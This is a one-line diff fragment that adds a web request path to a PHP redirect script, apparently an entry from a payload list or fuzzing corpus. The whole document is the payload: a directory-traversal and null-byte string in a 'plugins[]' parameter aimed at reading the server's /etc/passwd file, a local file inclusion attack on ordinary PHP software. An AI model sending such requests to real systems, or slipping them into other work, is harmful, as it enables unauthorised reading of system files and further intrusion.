@@ -1,0 +1,1 @@
+/src/redirect.php?plugins[]=../../../../etc/passwd%00
